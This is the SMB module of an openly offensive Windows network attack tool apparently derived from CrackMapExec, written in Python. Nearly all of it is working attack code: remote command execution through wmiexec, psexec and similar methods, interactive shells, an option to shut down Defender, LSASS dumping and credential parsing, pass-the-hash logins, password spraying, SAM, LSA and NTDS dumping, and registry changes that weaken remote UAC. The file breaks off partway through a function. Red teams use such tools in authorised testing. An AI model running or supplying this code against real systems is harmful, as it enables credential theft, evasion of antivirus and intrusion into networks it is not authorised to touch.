#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import ntpath
import socket
import time
import pdb


import impacket

from datetime import datetime
from functools import wraps
from io import StringIO
from traceback import format_exc

# Internals
import cmx

from cmx import config as cfg

from cmx.connection import *

from cmx.helpers.options import options
from cmx.helpers.logger import highlight, write_log
from cmx.helpers.misc import *
from cmx.helpers.wmirpc import RPCRequester

from cmx.logger import CMXLogAdapter

from cmx.protocols.smb.MISC.passpol import PassPolDump
from cmx.protocols.smb.MISC.reg import RegHandler
from cmx.protocols.smb.MISC.services import SVCCTL
from cmx.protocols.smb.MISC.smbspider import SMBSpider

from cmx.protocols.smb.EXECMETHODS.atexec import TSCH_EXEC as cmxTSCH_EXEC
from cmx.protocols.smb.EXECMETHODS.dcomexec import DCOMEXEC as cmxDCOMEXEC
from cmx.protocols.smb.EXECMETHODS.psexec import PSEXEC as cmxPSEXEC
from cmx.protocols.smb.EXECMETHODS.smbexec import SMBEXEC as cmxSMBEXEC
from cmx.protocols.smb.EXECMETHODS.wmiexec import WMIEXEC as cmxWMIEXEC

from cmx.servers.smb import CMXSMBServer



#################################################################################################
#################################################################################################

smb_share_name = gen_random_string(5).upper()
smb_server = None

def requires_smb_server(func):
    def _decorator(self, *args, **kwargs):
        global smb_server
        global smb_share_name

        get_output = False
        payload = None
        methods = []

        try:
            payload = args[0]
        except IndexError:
            pass
        try:
            get_output = args[1]
        except IndexError:
            pass

        try:
            methods = args[2]
        except IndexError:
            pass

        if 'payload' in kwargs:
            payload = kwargs['payload']

        if 'get_output' in kwargs:
            get_output = kwargs['get_output']

        if 'methods' in kwargs:
            methods = kwargs['methods']

        if not payload and self.args.execute:
            if not self.args.no_output:
                get_output = True

        if get_output or (methods and ('smbexec' in methods)):
            if not smb_server:
                logging.debug('Starting SMB server using share {}'.format(smb_share_name))
                logging.debug('Computeraccount {}'.format(self.hostname))

                # Need to calculate user/pass/hash thing here.
                smb_server = CMXSMBServer(self.logger, smb_share_name,
                                          verbose=self.args.debug,
                                          username=self.args.username,
                                          password=self.args.password,
                                          computer=self.hostname)
                smb_server.start()

        output = func(self, *args, **kwargs)

        if smb_server is not None:
            smb_server.shutdown()
            smb_server = None

        return output

    return wraps(func)(_decorator)


#################################################################################################
#
#   Init + protocol args
#
#################################################################################################


class smb(connection):
    """SMB connection class object."""

    def __init__(self, args, db, host):
        """Inits SMB class."""
        self.options = options(args)

        self.domain = None
        self.server_os = None
        self.os_arch = 0
        self.hash = None
        self.lmhash = ''
        self.nthash = ''
        self.remote_ops = None
        self.bootkey = None
        self.output_filename = None
        self.smbv = None
        self.signing = False
        self.smb_share_name = smb_share_name
        self.debug = args.debug
        self.dc_ip = args.domaincontroller
        self.domain_dns = None

        connection.__init__(self, args, db, host)

    @staticmethod
    def proto_args(parser, std_parser, module_parser):
        """SMB Protocol arguments."""
        smb_parser = parser.add_parser('smb', help="Attacks and enum over SMB", parents=[std_parser, module_parser])
        smb_parser.add_argument("-H", '--hash', metavar="HASH", dest='hash', nargs='+', default=[], help='NTLM hash(es) or file(s) containing NTLM hashes')
        smb_parser.add_argument("-tgt", '--tgticket', metavar="TGT", dest='tgt', nargs='+', default=[], help='KerberosTGT')
        smb_parser.add_argument("-tgs", '--tgservice', metavar="TGS", dest='tgs', nargs='+', default=[], help='KerberosTGS')
        smb_parser.add_argument("-dc", '--domaincontroller', type=str, default='', help='the IP of a domain controller')
        smb_parser.add_argument('--logs', action='store_true', help='Logs all results')
        smb_parser.add_argument('-v', '--verbose', action='count', default=0, help='Set verbosity level up to 5, -v -vv -vvvvv')

        igroup = smb_parser.add_mutually_exclusive_group()
        igroup.add_argument("-i", '--interactive', action='store_true', help='Start an interactive command prompt')

        dgroup = smb_parser.add_mutually_exclusive_group()
        dgroup.add_argument("-d", metavar="DOMAIN.DOMAIN", dest='domain', type=str, help="domain to authenticate to, MUST BE fully qualified. ie CONTOSO.LOCAL or CONTOSO.COM ")
        dgroup.add_argument("--local-auth", action='store_true', help='authenticate locally to each target')

        smb_parser.add_argument("--port", type=int, choices={445, 139}, default=445, help="SMB port (default: 445)")
        smb_parser.add_argument("--share", metavar="SHARE", default="C$", help="specify a share (default: C$)")
        smb_parser.add_argument("--gen-relay-list", metavar='OUTPUT_FILE', help="outputs all hosts that don't require SMB signing to the specified file")
        smb_parser.add_argument("--continue-on-success", action='store_true', help="continues authentication attempts even after successes")

        cgroup = smb_parser.add_argument_group("Credential Gathering", "Options for gathering credentials")
        cegroup = cgroup.add_mutually_exclusive_group()
        cegroup.add_argument("--sam", action='store_true', help='dump SAM hashes from target systems')
        cegroup.add_argument("--lsa", action='store_true', help='dump LSA secrets from target systems')
        #cegroup.add_argument("--dcsync", action='store_true', help='dcsync')
        cegroup.add_argument("--ntds", choices={'vss', 'drsuapi'}, nargs='?', const='drsuapi', help="dump the NTDS.dit from target DCs using the specifed method\n(default: drsuapi)")
        cgroup.add_argument("--ntds-history", action='store_true', help='Dump NTDS.dit password history - Can only be used with --ntds')
        cgroup.add_argument("--ntds-pwdLastSet", action='store_true', help='Shows the pwdLastSet attribute for each NTDS.dit account. Can only be used with --ntds')
        cgroup.add_argument("--ntds-status", action='store_true', help='Display the user status (enabled/disabled) - Can only be used with --ntds')

        spraygroup = smb_parser.add_argument_group("Password Attacks", "Options for spraying credentials")
        spraygroup.add_argument("--spray", nargs='?', const='', metavar='[PASSWORD]', help='Smart spray attack')
        spraygroup.add_argument("--useraspass", action='store_true', help='Try usernames as passwords')

        egroup = smb_parser.add_argument_group("Mapping/Enumeration", "Options for Mapping/Enumerating")
        egroup.add_argument("--shares", action="store_true", help="Enumerate shares and access")
        egroup.add_argument("--sessions", action='store_true', help='Enumerate active sessions')
        egroup.add_argument('--disks', action='store_true', help='Enumerate disks')
        egroup.add_argument("--loggedon", action='store_true', help='Enumerate logged on users')
        egroup.add_argument('--users', nargs='?', const='', metavar='USER', help='Enumerate and return all domain users')
        egroup.add_argument("--groups", nargs='?', const='', metavar='GROUP', help='Enumerate all domain groups')
        egroup.add_argument("--group", nargs='?', const='', metavar='targetGroup', help='Return users of a specified domain group')
        egroup.add_argument("--computers", nargs='?', const='', metavar='COMPUTER', help='Enumerate all domain computers')
        egroup.add_argument("--local-groups", nargs='?', const='', metavar='LOCAL_GROUPS', help='Enumerate all local groups')
        egroup.add_argument("--local-users", nargs='?', const='', metavar='LOCAL_USERS', help='Enumerate all local users')
        egroup.add_argument("--pass-pol", action='store_true', help='dump password policy')
        egroup.add_argument("--rid-brute", nargs='?', type=int, const=4000, metavar='MAX_RID', help='Enumerate users by bruteforcing RID\'s (default: 4000)')
        egroup.add_argument("--wmi", metavar='QUERY', type=str, help='issues the specified WMI query')
        egroup.add_argument("--dualhome", action="store_true", help='check for dual home')
        egroup.add_argument("--wmi-namespace", metavar='NAMESPACE', default='root\\cimv2', help='WMI Namespace (default: root\\cimv2)')

        sgroup = smb_parser.add_argument_group("Spidering", "Options for spidering shares")
        sgroup.add_argument("--spider", metavar='SHARE', type=str, help='share to spider, requires a pattern!')
        sgroup.add_argument("--spider-folder", metavar='FOLDER', default='.', type=str, help='folder to spider (default: root share directory)')
        sgroup.add_argument("--content", action='store_true', help='enable file content searching')
        sgroup.add_argument("--exclude-dirs", type=str, metavar='DIR_LIST', default='', help='directories to exclude from spidering')
        segroup = sgroup.add_mutually_exclusive_group()
        segroup.add_argument("--pattern", nargs='+', help='pattern(s) to search for in folders, filenames and file content')
        segroup.add_argument("--regex", nargs='+', help='regex(s) to search for in folders, filenames and file content')
        sgroup.add_argument("--depth", type=int, default=None, help='max spider recursion depth (default: infinity & beyond)')
        sgroup.add_argument("--only-files", action='store_true', help='only spider files')

        execgroup = smb_parser.add_argument_group("Command Execution", "Options for executing commands")
        execgroup.add_argument('--exec-method', choices={"wmiexec", "dcomexec", "smbexec", "atexec", "psexec"}, default='wmiexec', help="method to execute the command. (default: wmiexec)")
        execgroup.add_argument('--force-ps32', action='store_true', help='force the PowerShell command to run in a 32-bit process')
        execgroup.add_argument('--no-output', action='store_true', help='do not retrieve command output')
        execgroup.add_argument('--kd', action='store_true', help='Shut down defender before executing command (wmiexec)')
        execegroup = execgroup.add_mutually_exclusive_group()
        execegroup.add_argument("-x", metavar="COMMAND", dest='execute', help="execute the specified command")
        execegroup.add_argument("-X", metavar="PS_COMMAND", dest='ps_execute', help='execute the specified PowerShell command')

        execegroup.add_argument("-dump", "--dump", action='store_true', help="Uses Procdumpx64 to dump lsass and retrieve the output.")

        supergroup = smb_parser.add_argument_group("Multi-execution Commands")
        supergroup.add_argument("-netrecon", '--netrecon', action='store_true', help='Runs all the stuffs . this is for debugging, use at own risk')
        supergroup.add_argument("-hostrecon", '--hostrecon', action='store_true', help='Runs all the stuffs . this is for debugging, use at own risk')
        supergroup.add_argument("-recon", '--recon', action='store_true', help='Runs all recon commands')
        supergroup.add_argument("-a", '--all', action='store_true', help='Runs all the stuffs . this is for debugging, use at own risk')

        reggroup = smb_parser.add_argument_group("Registry Attacks and Enum")
        reggroup.add_argument("-fix-uac", '--fix-uac', action='store_true', help='Sets the proper Keys for remote high-integrity processes')
        reggroup.add_argument("-uac-status", '--uac-status', action='store_true', help='Check Remote UAC Status')

        servicegroup = smb_parser.add_argument_group("Interact with Services")
        servicegroup.add_argument("-start-service", '--start-service', action='store_true', help='not finished')
        servicegroup.add_argument("-stop-service", '--stop-service', action='store_true', help='not finished')

        smb_parser.add_argument('--save', action='store_true', help='Saves names to a file in current directory when doing user or computer enum')

        return parser


    def proto_logger(self):
        """Set up logger.

        First thing called for a connection, inside proto_flow()
        """
        self.logger = CMXLogAdapter(extra={
                                    'protocol': 'SMB',
                                    'host': self.host,
                                    'port': self.args.port,
                                    'hostname': self.hostname
                                    })
        self.options.logger = self.logger


###############################################################################

        ####### #     # #######  #####  #     # ####### #######
        #        #   #  #       #     # #     #    #    #
        #         # #   #       #       #     #    #    #
        #####      #    #####   #       #     #    #    #####
        #         # #   #       #       #     #    #    #
        #        #   #  #       #     # #     #    #    #
        ####### #     # #######  #####   #####     #    #######

###############################################################################
###############################################################################
#   Execution functions
#
# This section:
#   execute
#   ps_execute
#   wmi
#   interactive
# (fold next line)
###############################################################################


    @requires_admin
    @requires_smb_server
    def execute(self, payload=None, get_output=False, methods=None):
        """Execute a command using specified execution method. Defualt: wmiexec.

        Defaults to wmiexec

        Args:

        Raises:

        Returns:

        """
        if self.args.exec_method:
            method = self.args.exec_method
        else:
            method = 'wmiexec' # 'dcomexec', 'atexec', 'smbexec', 'psexec'

        if not payload:
            payload = self.args.execute

        if not self.args.no_output:
            get_output = True

        if self.args.kd:
            killDefender = True
        else:
            killDefender = False

        if hasattr(self, 'server'):
            self.server.track_host(self.host)


    # Start of execution method object builders

        if method == 'wmiexec':
            try:
                exec_method = cmxWMIEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash, self.args.share, killDefender)
                self.logger.announce('Executed command via wmiexec')
            except:
                self.logger.error('Failed to initiate wmiexec')
                logging.debug('Error executing via wmiexec, traceback:')
                logging.debug(format_exc())
                return

        elif method == 'dcomexec':
            try:
                exec_method = cmxDCOMEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash)
                self.logger.announce('Executed command via mmcexec')
            except:
                self.logger.error('Failed to initiate mmcexec')
                logging.debug('Error executing via mmcexec, traceback:')
                logging.debug(format_exc())
                return

        elif method == 'atexec':
            try:
                exec_method = cmxTSCH_EXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.hash) #self.args.share)
                self.logger.announce('Executed command via atexec')
            except:
                self.logger.error('Failed to initiate atexec')
                logging.debug('Error executing via atexec, traceback:')
                logging.debug(format_exc())
                return

        elif method == 'smbexec':
            try:
                exec_method = cmxSMBEXEC(self.host, self.smb_share_name, self.args.port, self.username, self.password, self.domain, self.hash, self.args.share)
                self.logger.announce('Executed via smbexec')
            except:
                self.logger.error('Failed to initiate smbexec')
                logging.debug('Error executing via smbexec, traceback:')
                logging.debug(format_exc())
                return

        elif method == 'psexec':
            try:
                exec_method = cmxPSEXEC(self.host, self.args.port, self.username, self.password, self.domain, self.hash) # aesKey, doKerberos=False, kdcHost, serviceName)
                self.logger.announce('Executed command via psexec')
            except:
                self.logger.error('Failed to initiate psexec')
                logging.debug('Error executing via psexec, traceback:')
                logging.debug(format_exc())
                return
    # End execution method init

        self.logger.debug('Executing {} via {}'.format(payload, method))

        # Execute payload/command using execution object
        output = '{}'.format(exec_method.execute(payload, get_output).strip())
        self.logger.success('Execution Completed.')

        # Read output if user command was provided
        if self.args.execute or self.args.ps_execute:
            self.logger.success('Results:')

            buf = StringIO(output).readlines()
            for line in buf:
                self.logger.highlight('    ' + line.strip())

        return output


    @requires_admin
    def ps_execute(self, payload=None, get_output=False, methods=None, force_ps32=False, dont_obfs=False):
        """Execute a powershell payload.

        Payload can be a file or command

        Args:

        Raises:

        Returns:

        """
        from cmx.helpers.powershell import create_ps_command

        if not payload and self.args.ps_execute:
            payload = self.args.ps_execute

        if not self.args.no_output:
            get_output = True

        return self.execute(create_ps_command(payload, force_ps32=force_ps32, dont_obfs=False, server_os=self.server_os), get_output, methods)


    @requires_admin
    @requires_smb_server
    def interactive(self, payload=None, get_output=False, methods=None):
        """Start an interactive shell."""
        self.logger.announce("Bout to get shellular")

        if self.args.exec_method:
            method = self.args.exec_method
        else:
            method = 'wmiexec' # 'dcomexec', 'atexec', 'smbexec', 'psexec'

        if not payload:
            payload = self.args.execute

        if not self.args.no_output:
            get_output = True

        if self.args.kd:
            killDefender = True
        else:
            killDefender = False

        if hasattr(self, 'server'):
            self.server.track_host(self.host)

    # Start of execution method object builders

        if method == 'wmiexec':
            try:
                exec_method = cmxWMIEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash, self.args.share, killDefender)
                logging.debug('Interactive shell using wmiexec')
            except:
                self.logger.error('Failed to initiate wmiexec')
                logging.debug('Error launching shell via wmiexec, traceback:')
                logging.debug(format_exc())
                return

        elif method == 'dcomexec':
            try:
                exec_method = cmxDCOMEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash)
                logging.debug('Interactive shell using mmcexec')
            except:
                self.logger.error('Failed to initiate mmcexec')
                logging.debug('Error launching shell via mmcexec, traceback:')
                logging.debug(format_exc())
                return

        elif method == 'atexec':
            try:
                exec_method = cmxTSCH_EXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.hash) #self.args.share)
                logging.debug('Interactive shell using atexec')
            except:
                self.logger.error('Failed to initiate atexec')
                logging.debug('Error launching shell via atexec, traceback:')
                logging.debug(format_exc())
                return

        elif method == 'smbexec':
            try:
                exec_method = cmxSMBEXEC(self.host, self.smb_share_name, self.args.port, self.username, self.password, self.domain, self.hash, self.args.share)
                logging.debug('Interactive shell using smbexec')
            except:
                self.logger.error('Failed to initiate smbexec')
                logging.debug('Error launching shell via smbexec, traceback:')
                logging.debug(format_exc())
                return

        elif method == 'psexec':
            try:
                exec_method = cmxPSEXEC(self.host, self.args.port, self.username, self.password, self.domain, self.hash) # aesKey, doKerberos=False, kdcHost, serviceName)
                self.logger.announce('Interactive shell using psexec')
            except:
                self.logger.error('Failed to initiate psexec')
                logging.debug('Error executing command via psexec, traceback:')
                logging.debug(format_exc())
                return

        try:
            exec_method.run(self.host, self.host)
        except Exception as e:
            logging.debug('b {}'.format(str(e)))


    @requires_admin
    def dump(self):
        """Procdump lsass."""

        if self.args.kd:
            killDefender = True
        else:
            killDefender = False

        try:
            exec_method = cmxWMIEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash, self.args.share, killDefender, self.logger)
            logging.debug('Dumping lsass using wmiexec')
        except:
            self.logger.error('Failed to initiate wmiexec')
            logging.debug('Error launching shell via wmiexec, traceback:')
            logging.debug(format_exc())
            return

        try:
            dumpFile = exec_method.dump()
        except Exception as e:
            logging.debug('dump failed because: {}'.format(str(e)))

        if dumpFile:
            self.parsedump(dumpFile)


    def parsedump(self, dumpfile):
        # Inspiration by @HackAndDo aka Pixis for these parse bits
        from pypykatz.pypykatz import pypykatz
        from pypykatz.lsadecryptor.cmdhelper import LSACMDHelper
        from contextlib import redirect_stdout
        import io


        # hacky BS cause i'm dumb
        class dum( object ):
            pass

        arg = dum()
        setattr(arg, 'outfile', False)
        setattr(arg, 'json', False)
        setattr(arg, 'grep', False)
        setattr(arg, 'kerberos_dir', False)
        setattr(arg, 'recursive', False)
        setattr(arg, 'directory', False)


        out = pypykatz.parse_minidump_file(dumpfile)

        f = io.StringIO()
        with redirect_stdout(f): # Hides output
            LSACMDHelper().process_results({"dumpfile": out}, [], arg)

        credentials = self.parse_output(f.getvalue())

        self.logger.highlight("Results:")
        for credential in credentials:
            self.logger.highlight("        %s\\%s:%s" % credential)


    def parse_output(self, output):
        import re
        regex = r"(?:username:? (?!NA)(?P<username>.+)\n.*domain(?:name)?:? (?P<domain>.+)\n)(?:.*password:? (?!None)(?P<password>.+)|.*\n.*NT: (?P<hash>.*))"
        matches = re.finditer(regex, output, re.MULTILINE | re.IGNORECASE)
        credentials= []
        for match in matches:
            domain = match.group("domain")
            username = match.group("username")
            password = match.group("password") or match.group("hash")
            if len(password) > 128:
                # its not a password or hash, probably a kerb pass
                pass
            else:
                credentials.append((domain, username, password))
        return set(credentials)


###############################################################################

        #####  ####### #     # #     # #######  #####  #######
       #     # #     # ##    # ##    # #       #     #    #
       #       #     # # #   # # #   # #       #          #
       #       #     # #  #  # #  #  # #####   #          #
       #       #     # #   # # #   # # #       #          #
       #     # #     # #    ## #    ## #       #     #    #
        #####  ####### #     # #     # #######  #####     #

###############################################################################
###############################################################################
#   Connection functions
#
#       Sets the self.conn object up
#
# This section:
#   create_smbv1_conn
#   create_smbv3_conn
#   create_conn_obj
# (fold next line)
###############################################################################

    def create_smbv1_conn(self):
        """Setup connection using smbv1."""
        try:
            logging.debug('Attempting SMBv1 connection to {}'.format(self.host))
            self.conn = impacket.smbconnection.SMBConnection(self.host, self.host, None, self.args.port) #, preferredDialect=impacket.smb.SMB_DIALECT)
        except socket.error as e:
            if str(e).find('Connection reset by peer') != -1:
                logging.debug('Connection was reset by target. SMBv1 might be disabled on {}'.format(self.host))
            elif str(e).find('No route to host') != -1:
                logging.debug('Could not connect to {}, no route to host. Can you ping it?'.format(self.host))
            else:
                logging.debug('Something went wrong, Could not connect to {}, tried smbv1'.format(self.host))
            return False
        except Exception as e:
            logging.debug('Error creating SMBv1 connection to {}: {}'.format(self.host, e))
            return False
        logging.debug('Connected using SMBv1 to: {}'.format(self.host))
        return True

    def create_smbv3_conn(self):
        """Setup connection using smbv3.

        Used for both SMBv2 and SMBv3
        """
        try:
            logging.debug('Attempting SMBv3 connection to {}'.format(self.host))
            self.conn = impacket.smbconnection.SMBConnection(self.host, self.host, None, self.args.port)
        except socket.error as e:
            if str(e).find('No route to host') != -1:
                logging.debug('No route to host {}'.format(self.host))
                self.logger.announce('Could not connect to {}, no route to host. Can you ping it?'.format(self.host))
            else:
                logging.debug('Something went wrong, Could not connect to {}, tried smbv3'.format(self.host))
            return False
        except Exception as e:
            logging.debug('Error creating SMBv3 connection to {}: {}'.format(self.host, e))
            return False
        logging.debug('Connected using SMBv3 to: {}'.format(self.host))
        return True


    def create_conn_obj(self):
        if self.create_smbv1_conn():
            return True
        elif self.create_smbv3_conn():
            return True

        return False


###############################################################################

        #       #######  #####  ### #     #
        #       #     # #     #  #  ##    #
        #       #     # #        #  # #   #
        #       #     # #  ####  #  #  #  #
        #       #     # #     #  #  #   # #
        #       #     # #     #  #  #    ##
        ####### #######  #####  ### #     #

###############################################################################
###############################################################################
#   Login functions
#
# This section:
#   plaintext_login
#   hash_login
# (fold next line)
###############################################################################


    def plaintext_login(self, domain, username, password):
        """Login using user+password.

        Args:

        Raises:

        Returns:

        """
        try:
            self.conn.login(username, password, domain)

            self.password = password
            self.username = username
            self.domain = domain
            self.admin_privs = self.check_if_admin()
            self.db.add_credential('plaintext', domain, username, password)

            if self.admin_privs:
                self.db.add_admin_user('plaintext', domain, username, password, self.host)

            out = '{}\\{}:{} {}'.format(domain,
                                        username,
                                        password,
                                        highlight('({})'.format(cfg.pwn3d_label) if self.admin_privs else ''))

            self.logger.success(out)
            if not self.args.continue_on_success:
                return True
        except impacket.smbconnection.SessionError as e:
            error, desc = e.getErrorString()
            self.logger.error('{}\\{}:{} {} {}'.format(domain,
                                                       username,
                                                       password,
                                                       error,
                                                       '({})'.format(desc) if self.args.verbose else ''))

            if error == 'STATUS_LOGON_FAILURE': self.inc_failed_login(username)

            return False


    def hash_login(self, domain, username, ntlm_hash):
        """Login using user + Hash.

        Args:

        Raises:

        Returns:

        """
        lmhash = ''
        nthash = ''

        #Checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(':') != -1:
            lmhash, nthash = ntlm_hash.split(':')
        else:
            nthash = ntlm_hash

        try:
            self.conn.login(username, '', domain, lmhash, nthash)

            self.hash = ntlm_hash
            if lmhash:
                self.lmhash = lmhash
            if nthash:
                self.nthash = nthash

            self.username = username
            self.domain = domain
            self.admin_privs = self.check_if_admin()
            self.db.add_credential('hash', domain, username, ntlm_hash)

            if self.admin_privs:
                self.db.add_admin_user('hash', domain, username, ntlm_hash, self.host)

            out = '{}\\{} {} {}'.format(domain,
                                        username,
                                        ntlm_hash,
                                        highlight('({})'.format(cfg.pwn3d_label) if self.admin_privs else ''))

            self.logger.success(out)
            if not self.args.continue_on_success:
                return True
        except impacket.smbconnection.SessionError as e:
            error, desc = e.getErrorString()
            self.logger.error('{}\\{} {} {} {}'.format(domain,
                                                       username,
                                                       ntlm_hash,
                                                       error,
                                                       '({})'.format(desc) if self.args.verbose else ''))

            if error == 'STATUS_LOGON_FAILURE':
                self.inc_failed_login(username)

            return False


    def kerberosLogin(self, user, password, domain='', ntlm_hash='', aesKey='', kdcHost=None, TGT=None,
                      TGS=None):
        """
        logins into the target system explicitly using Kerberos. Hashes are used if RC4_HMAC is supported.

        :param string user: username
        :param string password: password for the user
        :param string domain: domain where the account is valid for (required)
        :param string lmhash: LMHASH used to authenticate using hashes (password is not used)
        :param string nthash: NTHASH used to authenticate using hashes (password is not used)
        :param string aesKey: aes256-cts-hmac-sha1-96 or aes128-cts-hmac-sha1-96 used for Kerberos authentication
        :param string kdcHost: hostname or IP Address for the KDC. If None, the domain will be used (it needs to resolve tho)
        :param struct TGT: If there's a TGT available, send the structure here and it will be used
        :param struct TGS: same for TGS. See smb3.py for the format

        :return: None, raises a Session Error if error.
        """

        from impacket.krb5.ccache import CCache
        from impacket.krb5.kerberosv5 import KerberosError
        from impacket.krb5 import constants

        if kdcHost is None:
            self._kdcHost = self.dc_ip

        lmhash = ''
        nthash = ''

        #This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(':') != -1:
            lmhash, nthash = ntlm_hash.split(':')
        else:
            nthash = ntlm_hash


        if TGT is None and TGS is None:
            self.logger.error("TGT or TGS required")
            return False


        while True:
            try:
                if self.smbv == '1':
                    return self.conn.kerberos_login(user, password, domain, lmhash, nthash, aesKey, kdcHost,
                                                              TGT, TGS)
                return self.conn.kerberosLogin(user, password, domain, lmhash, nthash, aesKey, kdcHost, TGT,
                                                         TGS)
            except (smb.SessionError, smb3.SessionError) as e:
                raise impacket.smbconnection.SessionError(e.get_error_code(), e.get_error_packet())
            except KerberosError as e:
                if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                    # We might face this if the target does not support AES
                    # So, if that's the case we'll force using RC4 by converting
                    # the password to lm/nt hashes and hope for the best. If that's already
                    # done, byebye.
                    if lmhash is '' and nthash is '' and (aesKey is '' or aesKey is None) and TGT is None and TGS is None:
                        lmhash = compute_lmhash(password)
                        nthash = compute_nthash(password) 
                    else:
                        raise e
                else:
                    raise e

###############################################################################


                ######     #######     #####
                #     #    #          #     #
                #     #    #          #
                ######     #####      #  ####
                #   #      #          #     #
                #    #     #          #     #
                #     #    #######     #####


###############################################################################
###############################################################################
#   Registry functions
#
# This section:
#   fix_uac
#   uac_status
#
# (fold next line)
###############################################################################

    @requires_admin
    def fix_uac(self):
        r"""Make reg modifications for remote UAC.

        Adds the keys LocalAccountTokenFilterPolicy and EnableLUA
        to HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System

        Set values to 1
        """
        dcip = self.dc_ip
        # self.logger.announce('')

        class Ops:
            def __init__(self):
                self.action = 'ENABLEUAC'
                self.aesKey = None
                self.k = False
                self.dc_ip = dcip
                self.hashes = None
                self.port = 445

        options = Ops()

        try:
            reghandler = RegHandler(self.username, self.password, self.domain, self.logger, options)
            reghandler.run(self.host, self.host)

        except Exception as e:
            self.logger.error('Error creating/running regHandler connection: {}'.format(e))
            return

        #try:
        #    restart_uac()
        #except Exception as e:
        #    self.logger.error('Error restarting Server Service: {}'.format(e))
        #    return 

        return


    @requires_admin
    def uac_status(self):
        """Check the status of Remote UAC.

        (EnableLUA + LocalAccountTokenFilterPolicy)
        """
        dcip = self.dc_ip

        class Ops:
            def __init__(self):
                self.action = 'CHECKUAC'
                self.aesKey = None
                self.k = False
                self.dc_ip = dcip 
                self.hashes = None 
                self.port = 445

        options = Ops()

        try:
            reghandler = RegHandler(self.username, self.password, self.domain, self.logger, options)
            reghandler.run(self.host, self.host)

        except Exception as e:
            self.logger.error('Error creating/running regHandler connection: {}'.format(e))
            return 

        return


###############################################################################

         #####  ####### ######  #     # ###  #####  #######  #####
        #     # #       #     # #     #  #  #     # #       #     #
        #       #       #     # #     #  #  #       #       #
         #####  #####   ######  #     #  #  #       #####    #####
              # #       #   #    #   #   #  #       #             #
        #     # #       #    #    # #    #  #     # #       #     #
         #####  ####### #     #    #    ###  #####  #######  #####

###############################################################################
###############################################################################
#   Do stuff with services
#
# This section:
#   wmi
#   dualhome
#
# (fold next line)
###############################################################################

    def stop_service(self):
        """Restarts server service.

        Args:

        Raises:

        Returns:

        """
        dcip = self.dc_ip
        #self.logger.announce('')

        class Ops:
            def __init__(self, action='LIST'):
                self.action = action
                self.name = 'LanmanServer'
                self.aesKey = None
                self.k = False
                self.dc_ip = dcip 
                self.hashes = None 
                self.port = 445


        stopOptions = Ops(action='STOP')
        try:
            services = SVCCTL(self.username, self.password, self.domain, self.logger, stopOptions)
            services.run(self.host, self.host)

        except Exception as e:
            self.logger.debug('Error on stop connection: {}'.format(e))
            self.logger.success('LanmanServer restarted! Wait a few seconds for the restart to occur')
            pass 

        return


    def start_service(self):
        """Restarts server service

        Args:

        Raises:

        Returns:

        """
        #self.logger.announce('')
        dcip = self.dc_ip

        class Ops:
            def __init__(self, action='LIST'):
                self.action = action
                self.name = 'LanmanServer'
                self.aesKey = None
                self.k = False
                self.dc_ip = dcip 
                self.hashes = None 
                self.port = 445

        startOptions = Ops(action='START')
        try:
            services = SVCCTL(self.username, self.password, self.domain, self.logger, startOptions)
            services.run(self.host, self.host)

        except Exception as e:
            self.logger.error('Error on start connection: {}'.format(e))
            return 

        return




###############################################################################

                    #     #    #     #    ###
                    #  #  #    ##   ##     #
                    #  #  #    # # # #     #
                    #  #  #    #  #  #     #
                    #  #  #    #     #     #
                    #  #  #    #     #     #
                     ## ##     #     #    ###

###############################################################################
###############################################################################
#   WMI functions
#
# This section:
#   wmi
#   dualhome
#
# (fold next line)
###############################################################################

    @requires_admin
    def wmi(self, wmi_query=None, namespace=None):
        """Execute WMI query.

        Args:

        Raises:

        Returns:

        """
        self.logger.announce('Executing query:"{}" over wmi...'.format(str(self.args.wmi)))
        records = []
        if not namespace:
            namespace = self.args.wmi_namespace

        try:
            rpc = RPCRequester(self.host, self.domain, self.username, self.password, self.lmhash, self.nthash)
            rpc._create_wmi_connection(namespace=namespace)

            if wmi_query:
                query = rpc._wmi_connection.ExecQuery(wmi_query, lFlags=impacket.dcerpc.v5.dcom.wmi.WBEM_FLAG_FORWARD_ONLY)
            else:
                query = rpc._wmi_connection.ExecQuery(self.args.wmi, lFlags=impacket.dcerpc.v5.dcom.wmi.WBEM_FLAG_FORWARD_ONLY)
        except Exception as e:
            self.logger.error('Error creating WMI connection: {}'.format(e))
            return records

        while True:
            try:
                wmi_results = query.Next(0xffffffff, 1)[0]
                record = wmi_results.getProperties()
                records.append(record)
                for k, v in record.items():
                    self.logger.highlight('{} => {}'.format(k, v['value']))
                self.logger.highlight('')
            except Exception as e:
                if str(e).find('S_FALSE') < 0:
                    raise e
                else:
                    break

        return records


    @requires_admin
    def dualhome(self, wmi_query=None, namespace=None):
        """Check for dual homed networks.

        as requested by the man @fang0654
        """
        #self.logger.announce('Checking for dual homed networks')
        records = []
        records2 = []
        returnedIndex = []
        results = []

        if not namespace:
            namespace = self.args.wmi_namespace

        getCons = 'select index from win32_networkAdapter where netconnectionstatus = 2'
        #getIPs = 'select DNSDomainSuffixSearchOrder, IPAddress from win32_networkadapterconfiguration where index = {}'.format()

        try:
            rpc = RPCRequester(self.host, self.domain, self.username, self.password, self.lmhash, self.nthash)
            rpc._create_wmi_connection(namespace=namespace)
            query = rpc._wmi_connection.ExecQuery(getCons, lFlags=impacket.dcerpc.v5.dcom.wmi.WBEM_FLAG_FORWARD_ONLY)
        except Exception as e:
            self.logger.error('Error creating WMI connection: {}'.format(e))
            return records


        while True:
            try:
                wmi_results = query.Next(0xffffffff, 1)[0]
                record = wmi_results.getProperties()
                records.append(record)

                for k, v in record.items():
                    returnedIndex.append(v['value'])

            except Exception as e:
                if str(e).find('S_FALSE') < 0:
                    raise e
                else:
                    break

        try:
            for index in returnedIndex:
                queryStr = 'select DNSDomainSuffixSearchOrder, IPAddress from win32_networkadapterconfiguration where index = {}'.format(index) 
